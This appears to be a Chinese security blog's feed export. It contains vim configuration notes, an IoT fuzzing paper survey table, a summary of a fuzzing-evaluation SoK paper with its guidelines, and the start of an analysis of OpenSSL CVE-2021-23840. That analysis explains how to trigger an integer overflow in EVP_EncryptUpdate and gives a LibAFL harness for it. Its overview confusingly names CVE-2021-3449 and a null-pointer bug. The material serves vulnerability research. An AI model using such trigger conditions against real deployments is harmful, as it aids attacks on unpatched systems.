[FORMAT=%&#123;&amp;ff&#125;]\ [TYPE=%Y]\ [POS=%l,%v][%p%%]\ %&#123;strftime(\&quot;%d/%m/%y\ -\ %H:%M\&quot;)&#125;</span></span><br><span class="line"><span class="string">set statusline=[%F]%y%r%m%*%=[Line:%l/%L,Column:%c][%p%%]</span></span><br><span class="line"><span class="string">&quot;</span> 总是显示状态行</span><br><span class="line"><span class="built_in">set</span> laststatus=2</span><br><span class="line"><span class="string">&quot; 命令行（在状态行下）的高度，默认为1，这里是2</span></span><br><span class="line"><span class="string">set cmdheight=2</span></span><br><span class="line"><span class="string">&quot;</span> 侦测文件类型</span><br><span class="line">filetype on</span><br><span class="line"><span class="string">&quot; 载入文件类型插件</span></span><br><span class="line"><span class="string">filetype plugin on</span></span><br><span class="line"><span class="string">&quot;</span> 为特定文件类型载入相关缩进文件</span><br><span class="line">filetype indent on</span><br><span class="line"><span class="string">&quot; 保存全局变量</span></span><br><span class="line"><span class="string">set viminfo+=!</span></span><br><span class="line"><span class="string">&quot;</span> 带有如下符号的单词不要被换行分割</span><br><span class="line"><span class="built_in">set</span> iskeyword+=_,$,@,%,#,-</span><br><span class="line"><span class="string">&quot; 字符间插入的像素行数目</span></span><br><span class="line"><span class="string">set linespace=0</span></span><br><span class="line"><span class="string">&quot;</span> 增强模式中的命令行自动完成操作</span><br><span class="line"><span class="built_in">set</span> wildmenu</span><br><span class="line"><span class="string">&quot; 使回格键（backspace）正常处理indent, eol, start等</span></span><br><span class="line"><span class="string">set backspace=2</span></span><br><span class="line"><span class="string">&quot;</span> 允许backspace和光标键跨越行边界</span><br><span class="line"><span class="built_in">set</span> whichwrap+=&lt;,&gt;,h,l</span><br><span class="line"><span class="string">&quot; 可以在buffer的任何地方使用鼠标（类似office中在工作区双击鼠标定位）</span></span><br><span class="line"><span class="string">set mouse=a</span></span><br><span class="line"><span class="string">set selection=exclusive</span></span><br><span class="line"><span class="string">set selectmode=mouse,key</span></span><br><span class="line"><span class="string">&quot;</span> 通过使用: commands命令，告诉我们文件的哪一行被改变过</span><br><span class="line"><span class="built_in">set</span> report=0</span><br><span class="line"><span class="string">&quot; 在被分割的窗口间显示空白，便于阅读</span></span><br><span class="line"><span class="string">set fillchars=vert:\ ,stl:\ ,stlnc:\</span></span><br><span class="line"><span class="string">&quot;</span> 高亮显示匹配的括号</span><br><span class="line"><span class="built_in">set</span> showmatch</span><br><span class="line"><span class="string">&quot; 匹配括号高亮的时间（单位是十分之一秒）</span></span><br><span class="line"><span class="string">set matchtime=1</span></span><br><span class="line"><span class="string">&quot;</span> 光标移动到buffer的顶部和底部时保持3行距离</span><br><span class="line"><span class="built_in">set</span> scrolloff=3</span><br><span class="line"><span class="string">&quot; 为C程序提供自动缩进</span></span><br><span class="line"><span class="string">set smartindent</span></span><br><span class="line"><span class="string">&quot;</span> 高亮显示普通txt文件（需要txt.vim脚本）</span><br><span class="line"> au BufRead,BufNewFile *  setfiletype txt</span><br><span class="line"><span class="string">&quot;自动补全</span></span><br><span class="line"><span class="string">:inoremap ( ()&lt;ESC&gt;i</span></span><br><span class="line"><span class="string">:inoremap ) &lt;c-r&gt;=ClosePair(&#x27;)&#x27;)&lt;CR&gt;</span></span><br><span class="line"><span class="string">&quot;</span>:inoremap &#123; &#123;&lt;CR&gt;&#125;&lt;ESC&gt;O</span><br><span class="line"><span class="string">&quot;:inoremap &#125; &lt;c-r&gt;=ClosePair(&#x27;&#125;&#x27;)&lt;CR&gt;</span></span><br><span class="line"><span class="string">:inoremap [ []&lt;ESC&gt;i</span></span><br><span class="line"><span class="string">:inoremap ] &lt;c-r&gt;=ClosePair(&#x27;]&#x27;)&lt;CR&gt;</span></span><br><span class="line"><span class="string">:inoremap &quot;</span> <span class="string">&quot;&quot;</span>&lt;ESC&gt;i</span><br><span class="line">:inoremap <span class="string">&#x27; &#x27;</span><span class="string">&#x27;&lt;ESC&gt;i</span></span><br><span class="line"><span class="string">function! ClosePair(char)</span></span><br><span class="line"><span class="string">	if getline(&#x27;</span>.<span class="string">&#x27;)[col(&#x27;</span>.<span class="string">&#x27;) - 1] == a:char</span></span><br><span class="line"><span class="string">		return &quot;\&lt;Right&gt;&quot;</span></span><br><span class="line"><span class="string">	else</span></span><br><span class="line"><span class="string">		return a:char</span></span><br><span class="line"><span class="string">	endif</span></span><br><span class="line"><span class="string">endfunction</span></span><br><span class="line"><span class="string">filetype plugin indent on</span></span><br><span class="line"><span class="string">&quot;打开文件类型检测, 加了这句才可以用智能补全</span></span><br><span class="line"><span class="string">set completeopt=longest,menu</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>然后记得运行<code>vim +PluginInstall +qall</code>安装插件</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>IoT Fuzz论文调研</title>
    <url>/posts/b532f894.html</url>
    <content><![CDATA[<p>IoT领域有关Fuzz论文的汇总调研，随缘更新~</p>
<p>主要关注模糊测试分析的IoT目标对象、白&#x2F;灰&#x2F;黑测试、模拟级别、基于工具等信息</p>
<table>
<thead>
<tr>
<th align="center">论文名称</th>
<th align="center">期刊会议</th>
<th align="center">目标</th>
<th align="center">模糊测试</th>
<th align="center">模拟级别</th>
<th align="center">基于工具</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Firmadyne</td>
<td align="center">NDSS 2016</td>
<td align="center">Linux服务</td>
<td align="center"></td>
<td align="center">系统模拟</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Firm-AFL</td>
<td align="center">USENIX 2019</td>
<td align="center">Linux服务</td>
<td align="center">灰盒</td>
<td align="center">系统+用户模拟增强</td>
<td align="center">QEMU，TriForce，DECAF</td>
</tr>
<tr>
<td align="center">FirmAE</td>
<td align="center">ACSAC 2020</td>
<td align="center">Linux服务</td>
<td align="center"></td>
<td align="center">系统模拟</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">EQUAFL</td>
<td align="center">ISSTA 2022</td>
<td align="center">Linux服务</td>
<td align="center">灰盒</td>
<td align="center">用户模拟</td>
<td align="center">QEMU</td>
</tr>
<tr>
<td align="center">Greenhouse</td>
<td align="center">USENIX 2023</td>
<td align="center">Linux服务</td>
<td align="center">灰盒</td>
<td align="center">用户模拟</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">IoTFuzzer</td>
<td align="center">NDSS 2018</td>
<td align="center">带App的IoT设备</td>
<td align="center">黑盒</td>
<td align="center">硬件设备</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Diane</td>
<td align="center">SP 2021</td>
<td align="center">带App的IoT设备</td>
<td align="center">黑盒</td>
<td align="center">硬件设备</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">P2IM</td>
<td align="center">USENIX 2020</td>
<td align="center">裸机</td>
<td align="center">黑盒</td>
<td align="center">系统模拟</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">uEmu</td>
<td align="center">USENIX 2021</td>
<td align="center">裸机</td>
<td align="center">灰盒</td>
<td align="center">系统模拟</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Fuzzware</td>
<td align="center">USENIX 2022</td>
<td align="center">裸机</td>
<td align="center">灰盒</td>
<td align="center">系统模拟</td>
<td align="center">Unicorn</td>
</tr>
<tr>
<td align="center">SAFIREFUZZ</td>
<td align="center">USENIX 2023</td>
<td align="center">裸机</td>
<td align="center">灰盒</td>
<td align="center">系统模拟</td>
<td align="center">LibAFL</td>
</tr>
<tr>
<td align="center">SFuzz</td>
<td align="center">CCS 2022</td>
<td align="center">RTOS</td>
<td align="center">灰盒</td>
<td align="center">局部模拟</td>
<td align="center">Angr+Unicorn？</td>
</tr>
<tr>
<td align="center">LLMIF</td>
<td align="center">SP 2024</td>
<td align="center">ZigBee协议</td>
<td align="center">灰盒</td>
<td align="center">硬件设备</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">mGPTFuzz</td>
<td align="center">USENIX 2024</td>
<td align="center">Matter协议</td>
<td align="center">灰盒</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">HFL</td>
<td align="center">NDSS 2020</td>
<td align="center">Linux Kernel</td>
<td align="center"></td>
<td align="center">N&#x2F;A</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">ljon</td>
<td align="center">SP 2020</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">FireWire</td>
<td align="center">NDSS 2022</td>
<td align="center">无线基带</td>
<td align="center"></td>
<td align="center">系统模拟</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Agamotto</td>
<td align="center">USENIX 2020</td>
<td align="center">Linux Kernel Driver</td>
<td align="center"></td>
<td align="center">系统模拟</td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>Sok论文阅读</title>
    <url>/posts/b532f894.html</url>
    <content><![CDATA[<p><strong>题目</strong>：SoK: Prudent Evaluation Practices for Fuzzing  </p>
<p><strong>期刊&#x2F;会议</strong>：2024 IEEE Symposium on Security and Privacy (SP)  </p>
<p><strong>作者</strong>：Moritz Schloegel  （CISPA）</p>
<h2 id="论文简介"><a href="#论文简介" class="headerlink" title="论文简介"></a>论文简介</h2><p>对2018到2023年的有关fuzz的论文（150篇A类期刊）进行了总结，并且提出需要有一个更加精确谨慎的评估方法，确保成果工作的可重复性，可验证性</p>
<blockquote>
<p>These case studies allow us to assess the practical reproducibility of fuzzing research and identify archetypal pitfalls in the evaluation design. Unfortunately, our reproduced results reveal several deficiencies in the studied papers, and we are unable to fully support and reproduce the respective claims. To help the field of fuzzing move toward a scientifically reproducible evaluation strategy, we propose updated guidelines for conducting a fuzzing evaluation that future work should follow.  </p>
<p>In 2018, the first and most influential paper describing a reproducible evaluation design was published by Klees et al. [88]  (仅仅重复多次是不现实的，因为耗时，成本较高)</p>
</blockquote>
<p>注：选取的期刊&#x2F;会议（S&amp;P，USENIX，CCS，NDSS；ASE，ESEC&#x2F;FSE，ICSE）</p>
<h2 id="研究内容"><a href="#研究内容" class="headerlink" title="研究内容"></a>研究内容</h2><p>总结近年来fuzzing工作的不足以及有益的地方；对fuzzing论文关注以下几点：</p>
<ul>
<li>系统性地分析实验评估工作是怎么做的（metrics，targets，baselines，reported bugs）</li>
<li>检查常用的准则（业内普遍共识），例如Klee提出的或者其他业内普遍准则（不使用人造数据集）</li>
<li>影响评估工作确定性&#x2F;稳定性的潜在缺陷</li>
</ul>
<p>复现8篇不同领域的相关工作，并指出复现过程中存在问题和不足（<a href="https://github.com/fuzz-evaluator/">复现工作</a>）</p>
<p>提供了<a href="https://github.com/fuzz-evaluator/guidelines">guideline</a></p>
<p><strong>对于实验评估的Guideline：</strong></p>
<ul>
<li>Baseline：与相关的工作进行对比，查看提升</li>
<li>Targets：对相关的样本做测试，需要有已知漏洞的作为benchmark数据的ground truth</li>
<li>Setup &amp; Parameters：fuzz本身的随机性，需要长时间fuzz（24小时），需要有一个按时间的plot表；种子需要有较好格式</li>
<li>Evaluation Metrics：以漏洞发现能力为主，以代码覆盖率为第二个</li>
<li>Statistics Evaluation：使用统计学检验（检验零假设。。。）</li>
</ul>
<p><strong>对于FuzzBench的Guideline</strong>：</p>
<ul>
<li>fuzzer的表现与初始化种子影响较大。仅当fuzzer可以处理比较、分支情况时才可以无种子来跑。</li>
<li>不建议使用饱和语料库进行模糊测试，因为体现不到fuzzer的优势</li>
</ul>
<p><strong>对于覆盖率可靠性的Guideline</strong>：</p>
<ul>
<li>至少10个程序，12小时（作者推荐double）</li>
<li>目标应该是实际程序。</li>
</ul>
<h2 id="研究成果"><a href="#研究成果" class="headerlink" title="研究成果"></a>研究成果</h2><p>放一下其给出的guidelines</p>
<h3 id="Fuzzing-Evaluation-Guidelines"><a href="#Fuzzing-Evaluation-Guidelines" class="headerlink" title="Fuzzing Evaluation Guidelines"></a>Fuzzing Evaluation Guidelines</h3><p><strong>Current version</strong>: 1.0.3</p>
<p>Proposals for changes welcome (please open an issue for discussion or a pull request for changes).</p>
<p><strong>DISCLAIMER</strong>: These items represent are a best-effort attempt at capturing action items to follow during the evaluation of a scientific paper that focuses on fuzzing. <strong>They do not apply universally to all fuzzing methods - in certain scenarios, techniques may wish to deviate for good reason from these guidelines. In any case, a case-by-case judgment is necessary.</strong> The guidelines do not discuss many malicious choices that immediately negate any chance of a fair evaluation, such as giving your fuzzer an unfair advantage (e.g., by fine-tuning the fuzzer or its targets) or putting other fuzzers at a disadvantage.</p>
<p>A. Preparation for Evaluation</p>
<ol>
<li><p>Find relevant tools and baselines to compare against</p>
<ul>
<li>1.1 Include state-of-the-art techniques from both academia and industry</li>
<li>1.2 If your fuzzer is based on an existing fuzzer, include the baseline (to measure the delta of your changes, which allows attributing improvements to your technique)</li>
<li>1.3 Use recent versions of fuzzers</li>
<li>1.4 If applicable, derive a baseline variant of your technique that replaces core contributions by alternatives. For example, consider using a variant that replaces an informed algorithm with randomness.</li>
<li>1.5 If using AFL-style fuzzers, do not use afl-gcc but afl-clang-fast or afl-clang-lto.</li>
</ul>
</li>
<li><p>Identify suitable targets for the evaluation</p>
<ul>
<li>2.1 If applicable, consider using evaluation benchmarks, such as Fuzzbench (this allows to test many fuzzers under standardized conditions)</li>
<li>2.2 Select a representative set of programs from the target domain</li>
<li>2.3 Include targets used by related work (for comparability reasons)</li>
<li>2.4 Do not cherry-pick targets based on preliminary results</li>
<li>2.5 Do not pick multiple targets that share a considerable amount of code (e.g., two wrappers for the same library)</li>
<li>2.6 Do not use artificial programs or programs with artificially injected bugs</li>
</ul>
</li>
<li><p>Derive suitable experiments to evaluate your approach</p>
<ul>
<li><p>3.1 Evaluate on found bugs (if applicable)</p>
<ul>
<li><p>3.1.1 If using</p>
<p>new</p>
<p>bugs,</p>
<ul>
<li>3.1.1.1 include whether other fuzzers find the bug as well (so you can attribute finding this bug to your technique rather than being the first to fuzz this target); other fuzzers must have had the same computing resources</li>
<li>3.1.1.2 deduplicate crashing inputs to derive the true bug count<ul>
<li>3.1.1.2.1 If possible, use vendor confirmation to identify true bugs</li>
<li>3.1.1.2.2 Otherwise use manual triaging (consider automated deduplication as a pre-step to reduce number of findings)</li>
</ul>
</li>
<li>3.1.1.3 do not fuzz unsuitable programs for the sake of finding bugs (e.g., small hobby projects that are no longer maintained are not suitable)</li>
<li>3.1.1.4 do not search for bugs in unstable, fast moving development branches, but prefer stable&#x2F;release versions</li>
</ul>
</li>
<li><p>3.1.2 If using</p>
<p>known</p>
<p>bugs,</p>
<ul>
<li>3.1.2.1 use the known bugs as ground truth</li>
<li>3.1.2.2 take into account that known bugs may not have been deduplicated</li>
<li>3.1.2.3 do not evaluate on artificial bugs</li>
</ul>
</li>
<li><p>3.1.3 Do not use the number of (unique) crashing inputs as bug count</p>
</li>
</ul>
</li>
<li><p>3.2 Evaluate code coverage over time (if applicable)</p>
<ul>
<li>3.2.1 If possible, use source code-based coverage (e.g., llvm-cov or lcov)</li>
<li>3.2.2 Otherwise use a collision-free encoding</li>
<li>3.2.3 Measure coverage on a neutral binary; this binary should include only instrumentation needed to measure the coverage, but not sanitizers or fuzzer-specific instrumentation</li>
<li>3.2.4 If using dynamic binary translation, the coverage measurement should be independent of the translation (e.g., emulators may split a basic block into multiple translation blocks, disturbing measurements)</li>
</ul>
</li>
<li><p>3.3 If applicable, evaluate domain-specific aspects of your fuzzer</p>
</li>
<li><p>3.4 If applicable, conduct ablation studies to measure individual design choices</p>
</li>
<li><p>3.5 If applicable, evaluate the influence of hyperparameters on your design</p>
</li>
<li><p>3.6 If doing experiments using custom metrics,</p>
<ul>
<li>3.6.1 take special care to ensure a fair comparison to existing work.</li>
<li>3.6.2 In particular, avoid queue survivor bias (i.e., the queue only contains input fulfilling specific criteria) as it may favor your fuzzer. For example, your fuzzer optimizing towards the new, custom metric may keep inputs in the queue that others discard (even though they find the input at runtime) – evaluating only inputs on the queue thus gives your fuzzer an unfair advantage.</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>B. Documenting the Evaluation</p>
<ol>
<li>Describe the setup, including<ul>
<li>1.1 hardware used (such as CPU and RAM)</li>
<li>1.2 how many cores have been available to each fuzzing campaign (e.g., via CPU pinning)</li>
<li>1.3 technologies used, such as Docker or virtualization</li>
</ul>
</li>
<li>Choose and document experiment parameters, including<ul>
<li>2.1 a sufficiently long runtime (if possible &gt;&#x3D; 24h)</li>
<li>2.2 a sufficient number of repetitions&#x2F;trials to account for randomness and enable a robust statistical evaluation (if possible &gt;&#x3D; 10 trials)</li>
<li>2.3 fairness of computing resource allocation, i.e., all fuzzers have access to the same amount of computation resources. This requires particular consideration if a tool requires pre-computation(s).</li>
<li>2.4 suitable seeds:<ul>
<li>2.4.1 If possible, use uninformed seeds for coverage evaluation (for bug experiments, informed seeds may be beneficial)</li>
<li>2.4.2 Otherwise identify the coverage achieved by the initial seed set</li>
<li>2.4.3 Provide all fuzzers with the same set of seeds</li>
<li>2.4.4 Publish the used set of seeds</li>
</ul>
</li>
<li>2.5 targets:<ul>
<li>2.5.1 Use recent versions</li>
<li>2.5.2 If applicable, explain modifications to the programs or runtime environment (e.g., when you patch the program or set a lower stack size)</li>
</ul>
</li>
<li>2.6 other tools&#x2F;fuzzers:<ul>
<li>2.6.1 Use recent versions</li>
<li>2.6.2 If your fuzzer is based on another one, make sure the version you base your tool on and the one used in the evaluation are the same</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>C. Experiment Postprocessing</p>
<ol>
<li>Data Analysis<ul>
<li>1.1 Run a robust statistical evaluation to measure significance, such as Mann-Whitney U or bootstrap-based methods</li>
<li>1.2 Measure effect size using a test such as the Vargha and Delaney A^_{12} test</li>
</ul>
</li>
<li>Data Visualization<ul>
<li>2.1 If applicable, plot absolute values (such as for coverage over time)</li>
<li>2.2 Measure uncertainty, for example using standard deviation or (confidence) intervals in plots</li>
</ul>
</li>
<li>Bug Handling<ul>
<li>3.1 Deduplicate and triage crashing inputs</li>
<li>3.2 Report new bugs<ul>
<li>3.2.1 Follow responsible disclosure guidelines</li>
<li>3.2.2 If possible, minimize samples before reporting</li>
<li>3.2.3 If possible, attach available information, such as precise environment (OS, compilation flags, command line arguments, …), ASAN reports, and (minimized) crashing input</li>
<li>3.2.4 Consider reporting the bug with an anonymous identity and link to it in the paper during submission, such that reviewers can assess the bug and its impact themselves</li>
</ul>
</li>
<li>3.3 CVEs<ul>
<li>3.3.1 CVEs should be requested by maintainers</li>
<li>3.3.2 If the maintainers do not request a CVE, link to the bug tracker instead of requesting a CVE yourself</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>D. Artifact Release</p>
<ol>
<li>Artifact Contents<ul>
<li>1.1 Publish your code on a platform ensuring long-term availability, such as Zenodo or GitHub</li>
<li>1.2 Publish modifications of other tools<ul>
<li>1.2.1 If modifying other tools, publish any modifications</li>
<li>1.2.2 Publish your integration of other tools</li>
</ul>
</li>
<li>1.3 If possible, publish experiment data</li>
</ul>
</li>
<li>Artifact Documentation<ul>
<li>2.1 Document how to build your fuzzer</li>
<li>2.2 Document how to interact with your fuzzer</li>
<li>2.3 Document the source code</li>
<li>2.4 Document modifications&#x2F;extensions to other tools and their integration</li>
<li>2.5 Document how to run and reproduce experiments described in the paper</li>
</ul>
</li>
<li>Artifact Reusability<ul>
<li>3.1 Specify versions of all tools used</li>
<li>3.2 If possible, enable execution of your fuzzer independent of the underlying system, e.g., through virtualization or container engines</li>
<li>3.3 Avoid external dependencies that may be unavailable in the future, such as tarball downloads via https</li>
<li>3.4 Pin versions of dependencies</li>
<li>3.5 If applicable, maintain the commit history of underlying tools instead of squashing them</li>
<li>3.6 Double-check your code is complete and reusable</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2021-23840漏洞原理分析与复现</title>
    <url>/posts/4fd5388e.html</url>
    <content><![CDATA[<h2 id="CVE-2021-23840整数溢出漏洞"><a href="#CVE-2021-23840整数溢出漏洞" class="headerlink" title="CVE-2021-23840整数溢出漏洞"></a>CVE-2021-23840整数溢出漏洞</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>该漏洞为公开漏洞，漏洞编号为CVE-2021-3449，漏洞类型为空指针引用漏洞，存在于OpenSSL的1.1.1-1.1.1i版本，包含11.1.4目标PA设备中的开源组件OpenSSL版本1.1.1g。官方描述信息如下：</p>
<img src="/posts/4fd5388e/image-20250725093444651.png" class="" title="image-20250725093444651">

<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>比对修复版本，在修复版本增加的内容check如下：</p>
<img src="/posts/4fd5388e/image-20250717200045993.png" class="" title="image-20250717200045993">

<p>根据其注释，要求(inl-j) &amp; ~(bl -1)的值不能超过 INT_MAX - bl。</p>
<p>存在漏洞代码如下，在漏洞函数evp_EncryptDecryptUpdate内第350行进入if(i !&#x3D;0)分支，在第351行进入else分支，此时openssl会进行加密算法的padding部分，即将不是规定分组大小整数倍的长度补充到分组大小整数倍。此时会将*outl +&#x3D; bl对outl加上一个分组大小。跳出350行的if-else分支后，将输入长度除去不足分组大小的部分加到*outl中，因此如果inl本就接近INT_MAX，此时会发生整数溢出导致*outl变为INT_MAX即（0x80000000）,发生整数溢出。</p>
<p>注意触发该漏洞需要保证 i 不为0，也就是说ctx-&gt;buf不为空，那么就需要在执行EVP_EncryptUpdate前再执行一次不是分组大小整数倍的EVP_EncryptUpdate，并且需要保证inl &amp; 0xf &gt;&#x3D; j，防止作差时向上借位。</p>
<img src="/posts/4fd5388e/image-20250717202226709.png" class="" title="image-20250717202226709">

<p>构造libafl harness程序如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/evp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 条件编译 LibAFL 宏</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> USE_LIBAFL</span></span><br><span class="line">__AFL_FUZZ_INIT();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint8_t</span> key[<span class="number">16</span>] = &#123;<span class="number">0x80</span>, <span class="number">0xc7</span>, <span class="number">0x9e</span>, <span class="number">0x14</span>, <span class="number">0xef</span>, <span class="number">0x09</span>, <span class="number">0xbd</span>, <span class="number">0x42</span>, <span class="number">0x0b</span>, <span class="number">0x1f</span>, <span class="number">0x80</span>, <span class="number">0x98</span>, <span class="number">0x82</span>, <span class="number">0x6b</span>, <span class="number">0x12</span>, <span class="number">0xfd</span>&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint8_t</span> iv[<span class="number">16</span>]  = &#123;<span class="number">0x80</span>, <span class="number">0xc7</span>, <span class="number">0x9e</span>, <span class="number">0x14</span>, <span class="number">0xef</span>, <span class="number">0x09</span>, <span class="number">0xbd</span>, <span class="number">0x42</span>, <span class="number">0x0b</span>, <span class="number">0x1f</span>, <span class="number">0x80</span>, <span class="number">0x98</span>, <span class="number">0x82</span>, <span class="number">0x6b</span>, <span class="number">0x12</span>, <span class="number">0xfd</span>&#125;;</span><br><span class="line">    <span class="type">char</span> dest[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;  </span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> data_size = size;</span><br><span class="line">    <span class="keyword">if</span> (size &gt;= <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        size = ((<span class="type">uint32_t</span> *) data)[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;debug.log&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(fp, <span class="string">&quot;input size: %zu\n&quot;</span>, size);</span><br><span class="line">        <span class="comment">// fclose(fp);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> *msg = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        msg = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> (!msg) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            msg[i] = data[i % data_size];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> EVP_CIPHER* cipher = EVP_aes_128_cbc();</span><br><span class="line">    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();</span><br><span class="line">    assert(ctx != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> out_size = size;</span><br><span class="line">    <span class="type">size_t</span> blockSize = EVP_CIPHER_block_size(cipher);</span><br><span class="line">    <span class="type">size_t</span> out_len1 = out_size + blockSize;</span><br><span class="line">    <span class="type">uint8_t</span> *out = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(out_len1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!out) &#123;</span><br><span class="line">        <span class="keyword">if</span> (msg) <span class="built_in">free</span>(msg);</span><br><span class="line">        EVP_CIPHER_CTX_free(ctx);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> len1 = <span class="number">0</span>, len2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    assert(EVP_EncryptInit_ex(ctx, cipher, <span class="literal">NULL</span>, key, iv) == <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// make ctx-&gt;buf_len != 0</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> dummy_data[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;  <span class="comment">// Dummy data to populate buffer</span></span><br><span class="line">    assert(EVP_EncryptUpdate(ctx, out, &amp;len1, dummy_data, <span class="keyword">sizeof</span>(dummy_data)) == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; msg) &#123;</span><br><span class="line">        assert(EVP_EncryptUpdate(ctx, out, &amp;len1, msg, size) == <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        len1 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    assert(EVP_EncryptFinal_ex(ctx, out + len1, &amp;len2) == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> total_len = len1 + len2;</span><br><span class="line">    <span class="keyword">if</span> (fp) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(fp, <span class="string">&quot;total_len: %zu\n&quot;</span>, total_len);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    assert(total_len &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msg) <span class="built_in">free</span>(msg);</span><br><span class="line">    <span class="built_in">free</span>(out);</span><br><span class="line">    EVP_CIPHER_CTX_free(ctx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span 